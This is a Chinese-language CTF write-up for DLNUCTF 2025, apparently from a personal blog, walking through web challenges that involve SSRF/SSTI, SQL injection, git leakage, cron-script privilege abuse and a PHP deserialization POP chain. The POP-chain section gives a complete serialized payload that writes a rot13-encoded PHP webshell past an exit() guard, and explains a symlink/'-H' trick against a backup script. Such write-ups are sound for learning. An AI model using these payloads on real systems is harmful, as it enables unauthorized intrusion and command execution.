...
description: DLNUCTF 2025 Writeup
---
...
![](/img/ctf/dlnuctf-wp-001.png)

## ez_secret（ssti)😭

首先抓包发现

![](/img/ctf/dlnuctf-wp-002.png)

在头中不允许出现某些字符，所以我们全部删掉

![](/img/ctf/dlnuctf-wp-003.png)

提示提供url参数

![](/img/ctf/dlnuctf-wp-004.png)

是一个网页快照的功能

探测内网端口

![](/img/ctf/dlnuctf-wp-005.png)

端口在1337端口

然后扫目录发现secret（确实通过题目ez_secret可以猜出）

![](/img/ctf/dlnuctf-wp-006.png)

![](/img/ctf/dlnuctf-wp-007.png)

测试参数

![](/img/ctf/dlnuctf-wp-008.png)

发现是一个`ssti`，我们可以写一个代理，将本地参数url二次编码后发送到服务器，这样我们就可以使用fenjing来一把梭了
...
![](/img/ctf/dlnuctf-wp-011.png)

修改cookie为admin，刷新，进入

![](/img/ctf/dlnuctf-wp-012.png)

进入

![](/img/ctf/dlnuctf-wp-013.png)

点开老板的密码，发现config.conf,访问，得到源码（意思是flag文件会放在var/www/flag目录下）

<img src="C:\Users\HP\Desktop\Screenshots\屏幕截图 2025-09-17 173255.png" style="zoom: 50%;" />

查看网页源代码，发现flag/hahaha.php

![](C:\Users\HP\Desktop\Screenshots\屏幕截图 2025-09-17 173546.png)

随便点一个模块抓包观察，出现文件，考虑文件包含，但是发现没什么,就是源码

![](C:\Users\HP\Desktop\Screenshots\屏幕截图 2025-09-17 170201.png)

然后抓包，文件路径是/var/www/flag/hahaha.php,出编码，解码出源码

![](C:\Users\HP\Desktop\Screenshots\屏幕截图 2025-09-17 173832.png)
...
class Writer {
    ...
    public function __call($name, $args){
        ...
        file_put_contents($this->path,'<?php exit();'.$this->path);//死亡函数
    }
}
class Relay {
    public $target;
...
$a->next->target->worker->well->result->path = "php://filter/write=string.rot13|<?cuc riny(\$_CBFG[0]);?>|/resource=/var/www/html/2.php";//死亡函数绕过
//设置一个密码是0的2.php文件
...
```bash
O:6:"Loader":2:{s:4:"file";s:41:"data://text/plain,DLNUCTF2025 is awesome!";S:4:"nex\74";O:5:"Relay":1:{s:6:"target";O:6:"Bridge":1:{s:6:"worker";O:6:"Writer":2:{s:4:"path";N;s:4:"well";O:8:"Executor":1:{s:6:"result";O:6:"Writer":2:{s:4:"path";s:86:"php://filter/write=string.rot13|<?cuc riny($_CBFG[0]);?>|/resource=/var/www/html/2.php";s:4:"well";N;}}}}}}
```

pop链代码解释：

`$this->path`的设置是为了**绕过 “死亡函数”（如`<?php exit();`）和 WAF 过滤**，实现写入可执行的恶意 PHP 代码。具体拆解：

1. **`php://filter`协议**：PHP 的过滤器协议，可对文件内容进行编码 / 解码处理后写入。这里使用`string.rot13`过滤器（ROT13 编码，一种简单的字符替换加密，字母移位 13 位）。

2. **ROT13 编码的 PHP 代码**：

   - 编码前的原始代码（目标执行的命令）：`<?php system($_GET[0]);?>`（通过 GET 参数 0 执行系统命令）。
   - ROT13 编码后：`<?cuc riny($_CBFG[0]);?>`（`php`→`cuc`，`system`→`riny`，`GET`→`CBFG`，字母移位 13 位）。

3. **写入路径**：`/resource=/var/www/html/2.php`指定将处理后的内容写入`/var/www/html/2.php`。

4. **绕过 “死亡函数” 的逻辑**：
   代码中，`Writer->__call`方法会写入`'<?php exit();'.$this->path`，即实际写入的内容是：

   ```php
   <?php exit();php://filter/write=string.rot13|<?cuc riny($_CBFG[0]);?>|/resource=/var/www/html/2.php
   ```

   但通过`php://filter`的处理，`string.rot13`会只对`<?cuc...?>`解码为`<?php system($_GET[0]);?>`，最终写入`2.php`的有效代码是：

   ```php
   <?php exit();?><?php system($_GET[0]);?>
   ```

   其中`<?php exit();?>`被闭合，后续的`system`命令可正常执行（绕过了`exit()`的拦截）。

在“老板的秘密”模块，输入payload，成功上传2.php文件

![](C:\Users\HP\Desktop\Screenshots\屏幕截图 2025-09-17 180907.png)

蚁剑连接，找到run.sh文件

![](/img/ctf/dlnuctf-wp-014.png)

flag文件我们并没有权限去读取，查看run.sh文件
...
这个脚本会每隔10秒中,把`/var/www/html/` 目录下的文件,复制一份到 `/var/www/html/backup/` 中,并且权限设置为 0755. 是可读权限.
...
因为sh脚本会每隔10秒中,把`/var/www/html/` 目录下的文件,复制一份到 `/var/www/html/backup/` 中,并且权限设置为 0755. 是可读权限.

但是我们无权直接设置文件权限

所以打开在/var/www/html目录下的终端，建立软连接，创建一个/flag连接，将复制的flag文件的内容复制到readflag文件里

![image-20250917201120927](/img/ctf/dlnuctf-wp-015.png)

在这个目录下新建一个-H文件（根据linux系统命令参数的后来者胜出原则,我们在 -P 后边添加 -H 就会实现跟随链接复制了.所以,我们可以创建一个名字为 `-H`或者 `-L`的文件,然后再创建 /flag的链接,就可以复制flag的内容了.）

![](C:\Users\HP\Desktop\Screenshots\屏幕截图 2025-09-17 182731.png)

然后的等一会儿，打开readflag文件，flag出现

![](C:\Users\HP\Desktop\Screenshots\屏幕截图 2025-09-17 182701.png)
...
![](/img/ctf/dlnuctf-wp-016.png)

## File_Search_Portal✔️

简简单单扫个目录

![](/img/ctf/dlnuctf-wp-017.png)

发现git泄露

![](/img/ctf/dlnuctf-wp-018.png)
...
![](/img/ctf/dlnuctf-wp-020.png)

![](/img/ctf/dlnuctf-wp-021.png)

存在sql注入

抓包发现数据包被加密

![](/img/ctf/dlnuctf-wp-022.png)

大概测了测发现没有waf，并且为sqllite数据库

发现存在真假两个页面

![](/img/ctf/dlnuctf-wp-023.png)

![](/img/ctf/dlnuctf-wp-024.png)
...
```
内容php://file/convert.base64-encode/resource=index

//编码：
\u0070\u0068\u0070\u003a\u002f\u002f\u0066\u0069\u006c\u0065\u002f\u0063\u006f\u006e\u0076\u0065\u0072\u0074\u002e\u0062\u0061\u0073\u0065\u0036\u0034\u002d\u0065\u006e\u0063\u006f\u0064\u0065\u002f\u0072\u0065\u0073\u006f\u0075\u0072\u0063\u0065\u003d\u0069\u006e\u0064\u0065\u0078


\u0070\u0068\u0070\u003a\u002f\u002f\u0066\u0069\u006c\u0065\u002f\u0063\u006f\u006e\u0076\u0065\u0072\u0074\u002e\u0062\u0061\u0073\u0065\u0036\u0034\u002d\u0065\u006e\u0063\u006f\u0064\u0065\u002f\u0072\u0065\u0073\u006f\u0075\u0072\u0063\u0065\u003d\u0069\u006e\u0064\u0065\u0078
```

![](/img/ctf/dlnuctf-wp-025.png)读取到源码

![](/img/ctf/dlnuctf-wp-026.png)

读取roko0oo0090_se3ret.php

![](/img/ctf/dlnuctf-wp-027.png)

访问

![](/img/ctf/dlnuctf-wp-028.png)
...
![](/img/ctf/dlnuctf-wp-031.png)

![](/img/ctf/dlnuctf-wp-032.png)

发现权限不够

在查看计时任务发现一个sh脚本（还有一个蚁剑插件绕disable_function）

![](/img/ctf/dlnuctf-wp-033.png)

去查看文件

发现以root用户运行了一个sh脚本

![](/img/ctf/dlnuctf-wp-034.png)

并且我们可以去修改该sh脚本

![](/img/ctf/dlnuctf-wp-035.png)

过一会就可以读文件了

![](/img/ctf/dlnuctf-wp-036.png)

## 登陆就送✔️

首先在userid发现了sql注入漏洞

![](/img/ctf/dlnuctf-wp-037.png)

发现没有禁用`extractvalue`

![](/img/ctf/dlnuctf-wp-038.png)

扫目录得到表结构，直接拿数据

![](/img/ctf/dlnuctf-wp-039.png)

![](/img/ctf/dlnuctf-wp-040.png)

## 登录不送了。

和上题一样首先在userid发现了sql注入漏洞，并知道了表结构

![](/img/ctf/dlnuctf-wp-041.png)
